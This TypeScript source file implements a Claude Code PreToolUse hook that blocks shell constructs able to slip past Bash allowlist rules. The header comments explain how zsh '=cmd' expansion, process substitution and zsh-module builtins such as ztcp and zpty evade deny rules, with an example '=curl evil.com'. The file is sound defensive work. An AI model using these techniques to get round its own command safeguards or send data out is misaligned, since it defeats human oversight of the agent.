#!/usr/bin/env node
// Claude Code PreToolUse hook — no-shell-injection-bypass-guard.
//
// The fleet's Bash defenses are command allowlists (`Bash(curl:*)` deny rules)
// and AST `findInvocation` guards that key off the *base command*. A handful of
// shell constructs route around all of them by hiding or rewriting the command
// the parser sees. They have no legitimate fleet use, so this hook blocks them:
//
//   1. Zsh EQUALS expansion — `=cmd` at word start expands to `$(which cmd)`.
//      `=curl evil.com` runs `/usr/bin/curl evil.com`, but a `Bash(curl:*)`
//      deny never fires because the parser's base command is `=curl`, not
//      `curl`. The single most effective allowlist bypass.
//   2. Process substitution — `<(...)`, `>(...)`, `=(...)` run an arbitrary
//      inner command whose name no allowlist inspects.
//   3. Zsh-module exfil / exec / file-IO builtins — `zmodload` (loads
//      zsh/net/tcp, zsh/system, zsh/zpty, zsh/files) plus the builtins it
//      enables (`ztcp` network exfil, `zpty` command exec, `sysopen`/`sysread`/
//      `syswrite`/`sysseek` raw file IO that bypass binary checks), and
//      `emulate -c` (an eval-equivalent). Blocked as defense-in-depth.
//
// NOT blocked: `$(...)` / `${...}` / backtick substitution — legitimate and
// common in fleet Bash (e.g. `$(git symbolic-ref ...)` in the default-branch
// recipe). This hook targets only the evasion-only forms.
//
// Detection is AST-based (the fleet shell parser — parseShell / parseCommands),
// not raw-string regex, per `no-command-regex-in-hooks-guard`. Lifted from the
// Claude Code client's BashTool/bashSecurity.ts threat model.
//
// Exit codes: 0 — pass; 2 — block. Fails open on a malformed payload.

import { parseShell } from '@socketsecurity/lib-stable/shell/parse'

import { bashGuard, block, defineHook, runHook } from '../_shared/guard.mts'
import type { GuardResult } from '../_shared/guard.mts'
import { parseCommands } from '../_shared/shell-command.mts'

// Pre-flight skip set: the dispatcher imports this guard only when the raw
// command contains at least one of these substrings. Every block path requires
// one — `=` (EQUALS expansion `=cmd` whose binary starts with `=`, and the
// zsh `=(` proc-sub), `(` (all process-substitution forms `<(` / `>(` / `=(`
// place a `(` in the stream), and each zsh-module builtin name appears verbatim
// as the base command. A command containing none of these can never block.
export const triggers: readonly string[] = [
  '(',
  '=',
  'emulate',
  'sysopen',
  'sysread',
  'sysseek',
  'syswrite',
  'zmodload',
  'zpty',
  'ztcp',
]

// Single-token process-substitution op markers the parser collapses into one
// op entry (e.g. `<(` from `diff <(cat a) b`). The `>(` and `=(` forms do NOT
// collapse — the parser splits them (`> >(` → `>` `>` `(`; `=(` → word `=`
// then `(`), so those are detected by the adjacency scan in
// processSubstitutionBypass, not from this set.
const SUBSTITUTION_OPS = new Set(['<(', '=(', '>('])

// Zsh module loader + the builtins it enables — network exfil, command exec,
// raw file IO that bypass binary checks.
const ZSH_MODULE_BUILTINS = new Set([
  'emulate',
  'sysopen',
  'sysread',
  'sysseek',
  'syswrite',
  'zmodload',
  'zpty',
  'ztcp',
])

// A shell-quote operator entry, `{ op: '<(' }`.
function isOpEntry(entry: unknown): entry is { op: string } {
  return typeof entry === 'object' && entry !== null && 'op' in entry
}

// True when `entry` is the op `op`.
function isOp(entry: unknown, op: string): boolean {
  return isOpEntry(entry) && entry.op === op
}

// The bypass found in `command`, or undefined when clean. Pure — the test
// drives it directly. Uses the fleet shell parser; on a parse failure returns
// undefined (fail-open — a string we can't parse isn't a confirmed bypass).
export function shellInjectionBypass(command: string): string | undefined {
  let commands
  try {
    commands = parseCommands(command)
  } catch {
    /* c8 ignore start - parseCommands wraps parseShell in its own try/catch and returns [] on error; this branch is structurally unreachable */
    return undefined
    /* c8 ignore stop */
  }
  for (let i = 0, { length } = commands; i < length; i += 1) {
    const cmd = commands[i]!
    // Zsh EQUALS expansion: the base command literally starts with `=`.
    if (/^=[a-zA-Z_]/.test(cmd.binary)) {
      return `Zsh EQUALS expansion \`${cmd.binary}\` (dodges command allowlists — expands to \`$(which ${cmd.binary.slice(1)})\`)`
    }
    // Zsh-module builtin as the base command (zmodload, ztcp, …).
    if (ZSH_MODULE_BUILTINS.has(cmd.binary)) {
      // `emulate` is only dangerous with -c (eval-equivalent); a bare
      // `emulate zsh` shell-mode switch is fine.
      if (cmd.binary === 'emulate' && !cmd.args.includes('-c')) {
        continue
      }
      return `zsh-module builtin \`${cmd.binary}\` (network exfil / command exec / raw file IO that bypasses binary checks)`
    }
  }
  // Process substitution: scan the raw parser ops (parseCommands collapses them
  // into segment boundaries, so check the op stream directly).
  return processSubstitutionBypass(command)
}

function processSubstitutionBypass(command: string): string | undefined {
  let entries: unknown[]
  try {
    entries = parseShell(command) as unknown[]
  } catch {
    /* c8 ignore start - parseShell (shell-quote) does not throw on any observed input; this catch is a defensive backstop */
    return undefined
    /* c8 ignore stop */
  }
  for (let i = 0, { length } = entries; i < length; i += 1) {
    const entry = entries[i]
    // Single-token form: the parser collapsed `<(` into one op entry. (Only
    // `<(` collapses this way; `>(`/`=(` arrive split — handled below.)
    if (isOpEntry(entry) && SUBSTITUTION_OPS.has(entry.op)) {
      return `process substitution \`${entry.op})\` (runs an inner command no allowlist inspects)`
    }
    // Split form: an opening `(` whose immediately-preceding token marks it as
    // a process substitution rather than a subshell or command substitution.
    //   - `>(tee …)`  → parser emits `{op:'>'}` then `{op:'('}` (output proc-sub)
    //   - `=(sort …)` → parser emits the WORD `=` then `{op:'('}` (zsh proc-sub)
    // We must NOT flag the lookalikes the parser tokenizes the same shape as:
    //   - `$(…)` command substitution → `(` preceded by the WORD `$` (allowed)
    //   - a bare subshell `(…)` → `(` at position 0 / not preceded by `>`|`=`
    if (isOp(entry, '(') && i > 0) {
      const prev = entries[i - 1]
      const isOutputProcSub = isOp(prev, '>') || isOp(prev, '<')
      const isZshEqualsProcSub = prev === '='
      if (isOutputProcSub || isZshEqualsProcSub) {
        const form = isZshEqualsProcSub ? '=(' : '>('
        return `process substitution \`${form})\` (runs an inner command no allowlist inspects)`
      }
    }
  }
  return undefined
}

export const check = bashGuard((command): GuardResult => {
  const bypass = shellInjectionBypass(command)
  if (!bypass) {
    return undefined
  }
  return block(
    [
      '[no-shell-injection-bypass-guard] Blocked: command-allowlist bypass',
      '',
      `  ${bypass}.`,
      '',
      '  These shell constructs route around the fleet Bash allowlists +',
      '  findInvocation guards. They have no legitimate fleet use. (`$(...)`,',
      '  `${...}`, and backticks are NOT blocked — only the evasion-only forms.)',
    ].join('\n'),
  )
})

export const hook = defineHook({
  bypass: ['shell-injection'],
  check,
  event: 'PreToolUse',
  matcher: ['Bash'],
  triggers,
  type: 'guard',
})
void runHook(hook, import.meta.url)
